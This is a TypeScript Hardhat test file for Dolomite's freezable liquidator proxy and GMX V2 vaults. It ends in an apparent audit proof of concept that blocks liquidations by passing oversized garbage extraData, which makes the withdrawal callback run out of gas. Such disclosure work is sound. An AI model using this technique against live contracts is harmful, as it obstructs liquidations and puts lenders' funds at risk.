import { BalanceCheckFlag } from '@dolomite-margin/dist/src';
import { mine, takeSnapshot } from '@nomicfoundation/hardhat-network-helpers';
import { ZERO_ADDRESS } from '@openzeppelin/upgrades/lib/utils/Addresses';
import { expect } from 'chai';
import { BaseContract, BigNumber, BigNumberish, ContractTransaction, ethers } from 'ethers';
import {
  DolomiteRegistryImplementation,
  DolomiteRegistryImplementation__factory,
  EventEmitterRegistry,
  GmxV2IsolationModeTokenVaultV1,
  GmxV2IsolationModeTokenVaultV1__factory,
  GmxV2IsolationModeUnwrapperTraderV2,
  GmxV2IsolationModeVaultFactory,
  GmxV2IsolationModeWrapperTraderV2,
  GmxV2Registry,
  IGenericTraderProxyV1__factory,
  IGmxMarketToken,
  IGmxMarketToken__factory,
  IsolationModeFreezableLiquidatorProxy,
  IsolationModeFreezableLiquidatorProxy__factory,
} from '../../../src/types';
import { AccountStruct } from '../../../packages/base/src/utils/constants';
import { GMX_V2_CALLBACK_GAS_LIMIT, GMX_V2_EXECUTION_FEE } from '../../../src/utils/constructors/gmx';
import { createContractWithAbi, depositIntoDolomiteMargin } from '../../../packages/base/src/utils/dolomite-utils';
import { BYTES_ZERO, MAX_UINT_256_BI, NO_EXPIRY, ONE_BI, ONE_ETH_BI, ZERO_BI } from '../../../packages/base/src/utils/no-deps-constants';
import { getBlockTimestamp, impersonate, increaseByTimeDelta, revertToSnapshotAndCapture, snapshot } from '../../../packages/base/test/utils';
import {
  expectEvent,
  expectProtocolBalance,
  expectProtocolBalanceIsGreaterThan,
  expectThrow,
  expectWalletAllowance,
  expectWalletBalance,
} from '../../../packages/base/test/utils/assertions';
import { createDolomiteRegistryImplementation, createEventEmitter } from '../../../packages/base/test/utils/dolomite';
import {
  createGmxV2IsolationModeTokenVaultV1,
  createGmxV2IsolationModeUnwrapperTraderV2,
  createGmxV2IsolationModeVaultFactory,
  createGmxV2IsolationModeWrapperTraderV2,
  createGmxV2Library,
  createGmxV2MarketTokenPriceOracle,
  createGmxV2Registry,
  getInitiateWrappingParams,
  getOracleParams,
} from '../../utils/ecosystem-token-utils/gmx';
import { setExpiry } from '../../../packages/base/test/utils/expiry-utils';
import { liquidateV4WithZapParam } from '../../../packages/base/test/utils/liquidation-utils';
import {
  CoreProtocol,
  disableInterestAccrual,
  getDefaultCoreProtocolConfigForGmxV2,
  setupCoreProtocol,
  setupGMBalance,
  setupTestMarket,
  setupUserVaultProxy,
  setupWETHBalance,
} from '../../../packages/base/test/utils/setup';
import { getLiquidateIsolationModeZapPath } from '../../../packages/base/test/utils/zap-utils';
import { createSafeDelegateLibrary } from 'test/utils/ecosystem-token-utils/general';

const defaultAccountNumber = ZERO_BI;
const borrowAccountNumber = defaultAccountNumber.add(ONE_BI);
const borrowAccountNumber2 = borrowAccountNumber.add(ONE_BI);
const borrowAccountNumber3 = borrowAccountNumber2.add(ONE_BI);

const amountWei = ONE_ETH_BI.mul('1234'); // 1,234
const smallAmountWei = amountWei.mul(1).div(100);
const ONE_BI_ENCODED = '0x0000000000000000000000000000000000000000000000000000000000000001';
const NEW_GENERIC_TRADER_PROXY = '0x905F3adD52F01A9069218c8D1c11E240afF61D2B';

const gasLimit = process.env.COVERAGE !== 'true' ? 10_000_000 : 100_000_000;
const executionFee = process.env.COVERAGE !== 'true' ? GMX_V2_EXECUTION_FEE : GMX_V2_EXECUTION_FEE.mul(10);

describe('IsolationModeFreezableLiquidatorProxy', () => {
  let snapshotId: string;

  let core: CoreProtocol;
  let underlyingToken: IGmxMarketToken;
  let gmxV2Registry: GmxV2Registry;
  let allowableMarketIds: BigNumberish[];
  let unwrapper: GmxV2IsolationModeUnwrapperTraderV2;
  let wrapper: GmxV2IsolationModeWrapperTraderV2;
  let factory: GmxV2IsolationModeVaultFactory;
  let vault: GmxV2IsolationModeTokenVaultV1;
  let marketId: BigNumber;
  let liquidatorProxy: IsolationModeFreezableLiquidatorProxy;
  let eventEmitter: EventEmitterRegistry;

  let solidAccount: AccountStruct;
  let liquidAccount: AccountStruct;
  let liquidAccount2: AccountStruct;
  let withdrawalKeys: string[];
  let depositKey: string | undefined;
  let depositAmountIn: BigNumber;
  let depositMinAmountOut: BigNumber;
  let totalAmountWei: BigNumber;

  before(async () => {
    core = await setupCoreProtocol(getDefaultCoreProtocolConfigForGmxV2());

    const newImplementation = await createContractWithAbi<DolomiteRegistryImplementation>(
      DolomiteRegistryImplementation__factory.abi,
      DolomiteRegistryImplementation__factory.bytecode,
      [],
    );
    await core.dolomiteRegistryProxy.upgradeTo(newImplementation.address);

    liquidatorProxy = await createContractWithAbi<IsolationModeFreezableLiquidatorProxy>(
      IsolationModeFreezableLiquidatorProxy__factory.abi,
      IsolationModeFreezableLiquidatorProxy__factory.bytecode,
      [
        core.dolomiteRegistry.address,
        core.dolomiteMargin.address,
        core.expiry.address,
        core.liquidatorAssetRegistry.address,
      ],
    );

    const gmxV2Library = await createGmxV2Library();
    const userVaultImplementation = await createGmxV2IsolationModeTokenVaultV1(core, gmxV2Library);
    gmxV2Registry = await createGmxV2Registry(core, GMX_V2_CALLBACK_GAS_LIMIT);

    allowableMarketIds = [core.marketIds.nativeUsdc!, core.marketIds.weth];
    factory = await createGmxV2IsolationModeVaultFactory(
      core,
      gmxV2Library,
      gmxV2Registry,
      allowableMarketIds,
      allowableMarketIds,
      core.gmxEcosystemV2!.gmxEthUsdMarketToken,
      userVaultImplementation,
      executionFee
    );
    underlyingToken = IGmxMarketToken__factory.connect(await factory.UNDERLYING_TOKEN(), core.hhUser1);
    unwrapper = await createGmxV2IsolationModeUnwrapperTraderV2(
      core,
      factory,
      gmxV2Library,
      gmxV2Registry,
    );
    wrapper = await createGmxV2IsolationModeWrapperTraderV2(
      core,
      factory,
      gmxV2Library,
      gmxV2Registry,
    );
    const priceOracle = await createGmxV2MarketTokenPriceOracle(core, gmxV2Registry);
    await priceOracle.connect(core.governance).ownerSetMarketToken(factory.address, true);

    // Use actual price oracle later
    marketId = await core.dolomiteMargin.getNumMarkets();
    await setupTestMarket(core, factory, true, priceOracle);
    await disableInterestAccrual(core, core.marketIds.weth);
    await disableInterestAccrual(core, core.marketIds.nativeUsdc!);

    await factory.connect(core.governance).ownerSetAllowableCollateralMarketIds(
      [...allowableMarketIds, marketId],
    );

    await factory.connect(core.governance).ownerInitialize([unwrapper.address, wrapper.address]);
    await core.dolomiteMargin.connect(core.governance).ownerSetGlobalOperator(factory.address, true);
    // await core.dolomiteMargin.connect(core.governance).ownerSetGlobalOperator(factory.address, true);

    await gmxV2Registry.connect(core.governance).ownerSetUnwrapperByToken(factory.address, unwrapper.address);
    await gmxV2Registry.connect(core.governance).ownerSetWrapperByToken(factory.address, wrapper.address);

    eventEmitter = await createEventEmitter(core);
    const newRegistry = await createDolomiteRegistryImplementation();
    await core.dolomiteRegistryProxy.connect(core.governance).upgradeTo(newRegistry.address);
    await core.dolomiteRegistry.connect(core.governance).ownerSetEventEmitter(eventEmitter.address);

    await factory.createVault(core.hhUser1.address);
    const vaultAddress = await factory.getVaultByAccount(core.hhUser1.address);
    vault = setupUserVaultProxy<GmxV2IsolationModeTokenVaultV1>(
      vaultAddress,
      GmxV2IsolationModeTokenVaultV1__factory,
      core.hhUser1,
    );

    await setupWETHBalance(core, core.hhUser1, amountWei, core.dolomiteMargin);
    // await depositIntoDolomiteMargin(core, core.hhUser1, defaultAccountNumber, core.marketIds.weth, amountWei);

    await core.dolomiteRegistry.ownerSetLiquidatorAssetRegistry(core.liquidatorAssetRegistry.address);
    await core.liquidatorAssetRegistry.ownerAddLiquidatorToAssetWhitelist(marketId, core.liquidatorProxyV4.address);
    await core.liquidatorAssetRegistry.ownerAddLiquidatorToAssetWhitelist(marketId, liquidatorProxy.address);
    await core.dolomiteMargin.ownerSetGlobalOperator(liquidatorProxy.address, true);
    await core.dolomiteMargin.ownerSetGlobalOperator(NEW_GENERIC_TRADER_PROXY, true);
    await core.dolomiteMargin.ownerSetGlobalOperator(core.liquidatorProxyV4.address, true);
    await core.dolomiteRegistry.ownerSetGenericTraderProxy(NEW_GENERIC_TRADER_PROXY);
    const trader = await IGenericTraderProxyV1__factory.connect(
      NEW_GENERIC_TRADER_PROXY,
      core.governance,
    );
    await trader.ownerSetEventEmitterRegistry(eventEmitter.address);

    solidAccount = { owner: core.hhUser5.address, number: defaultAccountNumber };
    liquidAccount = { owner: vault.address, number: borrowAccountNumber };
    liquidAccount2 = { owner: vault.address, number: borrowAccountNumber2 };

    await setupGMBalance(core, core.hhUser1, amountWei.mul(2), vault);
    await vault.depositIntoVaultForDolomiteMargin(defaultAccountNumber, amountWei.mul(2));
    await vault.openBorrowPosition(
      defaultAccountNumber,
      borrowAccountNumber,
      amountWei,
      { value: executionFee },
    );
    await vault.openBorrowPosition(
      defaultAccountNumber,
      borrowAccountNumber2,
      amountWei,
      { value: executionFee },
    );
    await expectProtocolBalance(core, vault.address, borrowAccountNumber, marketId, amountWei);
    await expectProtocolBalance(core, vault.address, borrowAccountNumber2, marketId, amountWei);
    await expectWalletBalance(vault, underlyingToken, amountWei.mul(2));
    expect(await vault.isVaultAccountFrozen(defaultAccountNumber)).to.eq(false);
    expect(await vault.isVaultAccountFrozen(borrowAccountNumber)).to.eq(false);
    expect(await vault.isVaultAccountFrozen(borrowAccountNumber2)).to.eq(false);

    snapshotId = await snapshot();
  });

  beforeEach(async () => {
    withdrawalKeys = [];
    depositKey = undefined;
    depositAmountIn = ZERO_BI;
    depositMinAmountOut = ZERO_BI;
    totalAmountWei = amountWei;
    snapshotId = await revertToSnapshotAndCapture(snapshotId);
  });

  describe('#prepareForLiquidation', () => {
    let wethAmount: BigNumber;
    let amountWeiForLiquidation: BigNumber;

    enum ZapType {
      None,
      Deposit,
      Withdraw,
    }

    async function setupBalances(
      account: BigNumber,
      devalueCollateral: boolean = true,
      pushFullyUnderwater: boolean = true,
      performZapType: ZapType = ZapType.None,
    ) {
      // Create debt for the position
      let gmPrice = (await core.dolomiteMargin.getMarketPrice(marketId)).value;
      let wethPrice = (await core.dolomiteMargin.getMarketPrice(core.marketIds.weth)).value;
      const usdcPrice = (await core.dolomiteMargin.getMarketPrice(core.marketIds.nativeUsdc!)).value;

      wethAmount = amountWei.mul(gmPrice).div(wethPrice).mul(100).div(121);
      await vault.transferFromPositionWithOtherToken(
        account,
        defaultAccountNumber,
        core.marketIds.weth,
        wethAmount,
        BalanceCheckFlag.To,
      );

      if (performZapType === ZapType.Deposit) {
        depositAmountIn = amountWei.mul(gmPrice).div(usdcPrice).mul(1).div(100);
        depositMinAmountOut = amountWei.mul(99).div(100).mul(1).div(100);
        totalAmountWei = totalAmountWei.add(depositMinAmountOut);

        const initiateWrappingParams = await getInitiateWrappingParams(
          account,
          core.marketIds.nativeUsdc!,
          depositAmountIn,
          marketId,
          depositMinAmountOut,
          wrapper,
          executionFee,
        );
        await vault.swapExactInputForOutput(
          initiateWrappingParams.accountNumber,
          initiateWrappingParams.marketPath,
          initiateWrappingParams.amountIn,
          initiateWrappingParams.minAmountOut,
          initiateWrappingParams.traderParams,
          initiateWrappingParams.makerAccounts,
          initiateWrappingParams.userConfig,
          { value: executionFee },
        );
      } else if (performZapType === ZapType.Withdraw) {
        const result = await vault.initiateUnwrapping(
          account,
          smallAmountWei,
          core.tokens.nativeUsdc!.address,
          ONE_BI,
          ONE_BI_ENCODED,
          { value: executionFee },
        );
        const filter = eventEmitter.filters.AsyncWithdrawalCreated();
        withdrawalKeys.push((await eventEmitter.queryFilter(filter, result.blockNumber))[0].args.key);
      }

      if (devalueCollateral) {
        // Devalue the collateral so it's underwater
        gmPrice = gmPrice.mul(95).div(100);
        await core.testEcosystem!.testPriceOracle.setPrice(factory.address, gmPrice);
        await core.dolomiteMargin.ownerSetPriceOracle(marketId, core.testEcosystem!.testPriceOracle.address);
      }

      if (pushFullyUnderwater) {
        // Increase the of ETH, so it's underwater after the liquidation is handled too
        wethPrice = wethPrice.mul(107).div(100);
        await core.testEcosystem!.testPriceOracle.setPrice(core.tokens.weth.address, wethPrice);
        await core.dolomiteMargin.ownerSetPriceOracle(core.marketIds.weth, core.testEcosystem!.testPriceOracle.address);
      }

      amountWeiForLiquidation = wethAmount.mul(wethPrice).mul(105).div(100).div(gmPrice);
      if (amountWeiForLiquidation.gt(totalAmountWei)) {
        // Cap the size at amountWei
        amountWeiForLiquidation = totalAmountWei;
      }
    }

    async function cancelWrapping(): Promise<ContractTransaction> {
      await mine(1200);
      const filter = eventEmitter.filters.AsyncDepositCreated();
      depositKey = (await eventEmitter.queryFilter(filter))[0].args.key;
      return await vault.connect(core.hhUser1).cancelDeposit(depositKey);
    }

    async function performUnwrapping(key?: string): Promise<ContractTransaction> {
      if (!key) {
        const filter = eventEmitter.filters.AsyncWithdrawalCreated();
        withdrawalKeys.push((await eventEmitter.queryFilter(filter))[0].args.key);
      }
      return await core.gmxEcosystemV2!.gmxWithdrawalHandler.connect(core.gmxEcosystemV2!.gmxExecutor)
        .executeWithdrawal(
          withdrawalKeys[withdrawalKeys.length - 1],
          getOracleParams(core.tokens.weth.address, core.tokens.nativeUsdc!.address),
          { gasLimit },
        );
    }

    enum UnwrapperTradeType {
      FromWithdrawal = 0,
      FromDeposit = 1,
    }

    enum FinishState {
      WithdrawalFailed = 1,
      WithdrawalSucceeded = 2,
      Liquidated = 3,
      Expired = 4,
    }

    async function checkStateAfterUnwrapping(
      accountNumber: BigNumber,
      state: FinishState,
      vaultErc20Balance: BigNumber = amountWei,
      outputAmount: BigNumber = ZERO_BI,
      isFrozenAfterLiquidation?: boolean,
      outputAmountForSwap: BigNumber = ZERO_BI,
    ) {
      await expectWalletBalance(vault, underlyingToken, vaultErc20Balance);

      const withdrawals = await Promise.all(withdrawalKeys.map(key => unwrapper.getWithdrawalInfo(key)));
      const partitionedTotalOutputAmount = withdrawals.reduce((acc, withdrawal, i) => {
        // @follow-up Changed key check because it is now deleted
        if (
          state === FinishState.WithdrawalSucceeded
          || state === FinishState.Liquidated
          || state === FinishState.Expired
        ) {
          expect(withdrawal.key).to.eq(BYTES_ZERO);
          expect(withdrawal.vault).to.eq(ZERO_ADDRESS);
          expect(withdrawal.accountNumber).to.eq(ZERO_BI);
          expect(withdrawal.inputAmount).to.eq(ZERO_BI);
          expect(withdrawal.outputToken).to.eq(ZERO_ADDRESS);
          expect(withdrawal.outputAmount).to.eq(ZERO_BI);
          expect(withdrawal.isRetryable).to.eq(false);
        } else {
          expect(withdrawal.key).to.eq(withdrawalKeys[i]);
          expect(withdrawal.vault).to.eq(vault.address);
          expect(withdrawal.accountNumber).to.eq(borrowAccountNumber);
          expect(
            withdrawal.inputAmount.eq(amountWei)
            || withdrawal.inputAmount.eq(smallAmountWei)
            || withdrawal.inputAmount.eq(amountWei.sub(smallAmountWei)),
          ).to.eq(true);
          expect(withdrawal.outputToken).to.eq(core.tokens.nativeUsdc!.address);
          expect(withdrawal.outputAmount).to.gt(ZERO_BI);
          expect(withdrawal.isRetryable).to.eq(true);
        }
        if (!acc[withdrawal.outputToken]) {
          acc[withdrawal.outputToken] = ZERO_BI;
        }
        acc[withdrawal.outputToken] = acc[withdrawal.outputToken].add(withdrawal.outputAmount);
        return acc;
      }, {} as any);

      const deposit = depositKey ? await wrapper.getDepositInfo(depositKey) : undefined;
      if (deposit &&
        (state === FinishState.WithdrawalSucceeded ||
          state === FinishState.Liquidated ||
          state === FinishState.Expired)
      ) {
        expect(deposit.vault).to.eq(ZERO_ADDRESS);
        expect(deposit.accountNumber).to.eq(ZERO_BI);
        expect(deposit.inputToken).to.eq(ZERO_ADDRESS);
        expect(deposit.inputAmount).to.eq(ZERO_BI);
        expect(deposit.outputAmount).to.eq(ZERO_BI);
        expect(deposit.isRetryable).to.eq(false);
      } else if (deposit) {
        expect(deposit.vault).to.eq(vault.address);
        expect(deposit.accountNumber).to.eq(borrowAccountNumber);
        expect(deposit.inputToken).to.eq(core.tokens.nativeUsdc!.address);
        expect(deposit.inputAmount).to.eq(depositAmountIn);
        expect(deposit.outputAmount).to.eq(depositMinAmountOut);
        expect(deposit.isRetryable).to.eq(true);
      }

      if (
        state === FinishState.WithdrawalSucceeded
        || state === FinishState.Liquidated
        || state === FinishState.Expired
      ) {
        await expectProtocolBalance(core, vault.address, accountNumber, marketId, ZERO_BI);
        expect(await vault.isVaultAccountFrozen(defaultAccountNumber)).to.eq(false);
        expect(await vault.isVaultAccountFrozen(accountNumber)).to.eq(false);
        expect(await vault.shouldSkipTransfer()).to.eq(false);
        expect(await vault.isDepositSourceWrapper()).to.eq(false);

        if (state === FinishState.Liquidated && isFrozenAfterLiquidation) {
          expect(await vault.isVaultFrozen()).to.eq(isFrozenAfterLiquidation);
        } else {
          expect(await vault.isVaultFrozen()).to.eq(false);
        }

        if (state === FinishState.Liquidated) {
          await expectProtocolBalance(
            core,
            vault.address,
            accountNumber,
            core.marketIds.nativeUsdc!,
            outputAmount.sub(outputAmountForSwap).sub(depositAmountIn),
          );
          await expectProtocolBalance(
            core,
            vault,
            accountNumber,
            core.marketIds.weth,
            ZERO_BI,
          );
          await expectProtocolBalance(
            core,
            solidAccount.owner,
            solidAccount.number,
            core.marketIds.nativeUsdc!,
            ZERO_BI,
          );
          await expectProtocolBalance(
            core,
            solidAccount.owner,
            solidAccount.number,
            marketId,
            ZERO_BI,
          );
          // The trader always outputs the debt amount (which means the solid account does not earn a profit in ETH)
          await expectProtocolBalance(
            core,
            solidAccount.owner,
            solidAccount.number,
            core.marketIds.weth,
            ZERO_BI,
          );
        } else if (state === FinishState.WithdrawalSucceeded) {
          await expectProtocolBalance(core, vault.address, accountNumber, core.marketIds.weth, wethAmount.mul(-1));
        } else {
          await expectProtocolBalanceIsGreaterThan(
            core,
            { owner: vault.address, number: accountNumber },
            core.marketIds.weth,
            ONE_BI,
            0,
          );
        }
      } else {
        await expectProtocolBalance(core, vault.address, accountNumber, marketId, totalAmountWei);
        await expectProtocolBalance(
          core,
          vault.address,
          accountNumber,
          core.marketIds.weth,
          wethAmount.mul(-1),
        );
        expect(await vault.isVaultAccountFrozen(defaultAccountNumber)).to.eq(false);
        expect(await vault.isVaultAccountFrozen(accountNumber)).to.eq(true);
        expect(await vault.isVaultFrozen()).to.eq(true);
        expect(await vault.shouldSkipTransfer()).to.eq(false);
        expect(await vault.isDepositSourceWrapper()).to.eq(false);
        await expectWalletBalance(vault, underlyingToken, vaultErc20Balance);
      }

      if (state === FinishState.WithdrawalFailed) {
        const weth = core.tokens.weth;
        const usdc = core.tokens.nativeUsdc!;
        if (withdrawals[0].outputToken === weth.address) {
          expect(partitionedTotalOutputAmount).to.be.gt(ZERO_BI);
          await expectWalletBalance(unwrapper, weth, partitionedTotalOutputAmount[weth.address]);
          await expectWalletBalance(unwrapper, usdc, ZERO_BI);
        } else {
          await expectWalletBalance(unwrapper, usdc, partitionedTotalOutputAmount[usdc.address]);
          await expectWalletBalance(unwrapper, weth, ZERO_BI);
        }
        if (deposit) {
          if (deposit.inputToken === weth.address) {
            expect(partitionedTotalOutputAmount).to.be.gt(ZERO_BI);
            await expectWalletBalance(wrapper, weth, depositAmountIn);
            await expectWalletBalance(wrapper, usdc, ZERO_BI);
          } else {
            await expectWalletBalance(wrapper, usdc, depositAmountIn);
            await expectWalletBalance(wrapper, weth, ZERO_BI);
          }
        }
      } else {
        await expectWalletBalance(unwrapper, core.tokens.weth, ZERO_BI);
        await expectWalletBalance(unwrapper, core.tokens.nativeUsdc!, ZERO_BI);
      }

      await expectWalletAllowance(wrapper, unwrapper, core.tokens.weth, ZERO_BI);
      await expectWalletAllowance(wrapper, unwrapper, core.tokens.nativeUsdc!, ZERO_BI);
    }

    async function performLiquidationAndCheckState(
      vaultErc20Balance: BigNumber,
      executeTransferForOtherAccount: boolean,
      isFrozen: boolean,
    ) {
      // Give the contract the WETH needed to complete the exchange
      const testTrader = await impersonate(core.testEcosystem!.testExchangeWrapper.address, true, wethAmount.mul(10));
      await setupWETHBalance(
        core,
        testTrader,
        wethAmount.mul(5),
        { address: '0x000000000000000000000000000000000000dead' },
      );

      const allKeys = withdrawalKeys.concat(depositKey ? [depositKey] : []);
      const tradeTypes = allKeys.map(key => key === depositKey
        ? UnwrapperTradeType.FromDeposit
        : UnwrapperTradeType.FromWithdrawal);
      const liquidationData = ethers.utils.defaultAbiCoder.encode(
        ['uint8[]', 'bytes32[]', 'bool'],
        [tradeTypes, allKeys, executeTransferForOtherAccount],
      );
      const withdrawals = await Promise.all(withdrawalKeys.map(key => unwrapper.getWithdrawalInfo(key)));
      const deposit = depositKey ? await wrapper.getDepositInfo(depositKey) : undefined;
      const allStructs = withdrawals
        .map(w => ({ inputAmount: w.inputAmount, outputAmount: w.outputAmount }))
        .concat(deposit ? [{ inputAmount: deposit.outputAmount, outputAmount: deposit.inputAmount }] : []);
      const outputAmountForSwap = allStructs
        .reduce((acc, struct) => {
          if (acc.input.gt(ZERO_BI)) {
            const inputAmount = acc.input.lt(struct.inputAmount)
              ? acc.input
              : struct.inputAmount;
            const outputAmount = acc.input.lt(struct.inputAmount)
              ? struct.outputAmount.mul(acc.input).div(struct.inputAmount)
              : struct.outputAmount;

            acc.input = acc.input.sub(inputAmount);
            acc.output = acc.output.add(outputAmount);
          }
          return acc;
        }, { output: ZERO_BI, input: amountWeiForLiquidation })
        .output;
      const totalOutputAmount = allStructs.reduce((acc, struct) => {
        return acc.add(struct.outputAmount);
      }, ZERO_BI);

      const zapParam = await getLiquidateIsolationModeZapPath(
        [marketId, core.marketIds.nativeUsdc!, core.marketIds.weth],
        [amountWeiForLiquidation, outputAmountForSwap, wethAmount],
        unwrapper,
        core,
      );
      zapParam.tradersPath[0].tradeData = liquidationData;
      await liquidateV4WithZapParam(
        // solidAccount.owner,
        // core.hhUser5,
        core,
        solidAccount,
        liquidAccount,
        zapParam,
      );

      await checkStateAfterUnwrapping(
        borrowAccountNumber,
        FinishState.Liquidated,
        vaultErc20Balance,
        totalOutputAmount,
        isFrozen,
        outputAmountForSwap,
      );
    }

    async function expectNoEvent(
      contract: BaseContract,
      contractTransaction: ContractTransaction,
      eventName: string,
      args: object,
    ): Promise<void> {
      const argsArray = Object.values(args);
      if (argsArray.length > 0) {
        return expect(contractTransaction).to.not.emit(contract, eventName).withArgs(...argsArray);
      }
      return expect(contractTransaction).to.not.emit(contract, eventName);
    }

    it.only('DOS Liquidations with OOG via extra data', async () => {
      await setupBalances(borrowAccountNumber);
      
      // take a snapshot of the current state of the blockchain
      const beforePrepareForLiquidationSnapshot = await takeSnapshot();

      // do a normal liquidation with extraData as ONE_BI_ENCODED (1) to show that it works
      const prepareForLiquidationResult = await liquidatorProxy.prepareForLiquidation({
        liquidAccount,
        freezableMarketId: marketId,
        inputTokenAmount: amountWei,
        outputMarketId: core.marketIds.nativeUsdc!,
        minOutputAmount: ONE_BI,
        expirationTimestamp: NO_EXPIRY,
        extraData: ONE_BI_ENCODED,
      });

      const filter = eventEmitter.filters.AsyncWithdrawalCreated();
      const withdrawalKey = (await eventEmitter.queryFilter(
        filter, 
        prepareForLiquidationResult.blockNumber))[0].args.key;


      const result = await core.gmxEcosystemV2!.gmxWithdrawalHandler.connect(core.gmxEcosystemV2!.gmxExecutor)
      .executeWithdrawal(
        withdrawalKey,
        getOracleParams(core.tokens.weth.address, core.tokens.nativeUsdc!.address),
        { gasLimit: 20_500_000 },
      );
      
      await expectEvent(eventEmitter, result, 'AsyncWithdrawalFailed', {
        key: withdrawalKey,
        token: factory.address,
        reason: `OperationImpl: Undercollateralized account <${vault.address.toLowerCase()}, ${borrowAccountNumber.toString()}>`,
      });
      
      // restore snapshot to show how we desecrate things
      await beforePrepareForLiquidationSnapshot.restore();

      // create an extra data payload that has the first 32 bytes as the minimum output 1 and append to that garbage
      // we do this to cause a gas spike when loaded into memory and cause the afterWithdrawalExecution function to revert
      const abi = ethers.utils.defaultAbiCoder;
      const garbageBytes = Buffer.alloc(100_000);      
      const _extraData: ethers.utils.BytesLike = abi.encode(["uint256", "bytes"], [1, garbageBytes]);
      
      const prepareForLiquidationResultDosed = await liquidatorProxy.prepareForLiquidation({
          liquidAccount,
          freezableMarketId: marketId,
          inputTokenAmount: amountWei,
          outputMarketId: core.marketIds.nativeUsdc!,
          minOutputAmount: ONE_BI,
          expirationTimestamp: NO_EXPIRY,
          extraData: _extraData,
        }, { gasLimit: 20_000_000 }
      ); // This now fails because _extraData is invalid

      const withdrawalKeySecondCase = (await eventEmitter.queryFilter(
        filter, 
        prepareForLiquidationResultDosed.blockNumber))[0].args.key;

      // imitate GMX and call the callback
      const executeWithdrawalResultSecondCase = await core.gmxEcosystemV2!.gmxWithdrawalHandler.connect(
          core.gmxEcosystemV2!.gmxExecutor
        ).executeWithdrawal(
          withdrawalKeySecondCase,
        getOracleParams(core.tokens.weth.address, core.tokens.nativeUsdc!.address),
        { gasLimit: 20_500_000 },
      );

      // show that in this case, no event was sent
      await expectNoEvent(eventEmitter, executeWithdrawalResultSecondCase, 'AsyncWithdrawalFailed', {
        key: withdrawalKeySecondCase,
        token: factory.address,
        reason: `OperationImpl: Undercollateralized account <${vault.address.toLowerCase()}, ${borrowAccountNumber.toString()}>`,
      });

      // show that GMX itself emitted the `AfterWithdrawalExecutionError` event when the callback was called (due to OOG)
      // to be noted, if the OOG had happened further in the call, it would of been caught in the executeWithdrawal try/catch

      // Note: the line is commented because the Dolomite local `IGmxWithdrawalHandler` file is missing the AfterWithdrawalExecutionError event
      // if you wish to also observe this event, add the solidity code bellow in contracts\external\interfaces\gmx\IGmxWithdrawalHandler.sol      
      // expect(executeWithdrawalResultSecondCase).to.emit(core.gmxEcosystemV2!.gmxWithdrawalHandler, "AfterWithdrawalExecutionError");

      /* 
        diff --git a/contracts/external/interfaces/gmx/IGmxWithdrawalHandler.sol b/contracts/external/interfaces/gmx/IGmxWithdrawalHandler.sol
        index 6f4b308..03446d3 100644
        --- a/contracts/external/interfaces/gmx/IGmxWithdrawalHandler.sol
        +++ b/contracts/external/interfaces/gmx/IGmxWithdrawalHandler.sol
        @@ -22,6 +22,37 @@ pragma solidity ^0.8.9;
        
        import { GmxOracleUtils } from "./GmxOracleUtils.sol";
        
        +library Withdrawal {
        +    struct Addresses {
        +        address account;
        +        address receiver;
        +        address callbackContract;
        +        address uiFeeReceiver;
        +        address market;
        +        address[] longTokenSwapPath;
        +        address[] shortTokenSwapPath;
        +    }
        +
        +    struct Numbers {
        +        uint256 marketTokenAmount;
        +        uint256 minLongTokenAmount;
        +        uint256 minShortTokenAmount;
        +        uint256 updatedAtBlock;
        +        uint256 executionFee;
        +        uint256 callbackGasLimit;
        +    }
        +
        +    struct Flags {
        +        bool shouldUnwrapNativeToken;
        +    }
        +
        +    struct Props {
        +        Addresses addresses;
        +        Numbers numbers;
        +        Flags flags;
        +    }
        +}
        +
        /**
          * @title   IGmxWithdrawalHandler
          * @author  Dolomite
        @@ -66,6 +97,8 @@ interface IGmxWithdrawalHandler {
        
            error InsufficientWntAmount(uint256 wntAmount, uint256 executionFee);
        
        +    event AfterWithdrawalExecutionError(bytes32 key, Withdrawal.Props withdrawal);
        +
            function createWithdrawal(address _account, CreateWithdrawalParams calldata _params) external returns (bytes32);
        
            function cancelWithdrawal(bytes32 _key) external;

      */
    });  
  });
});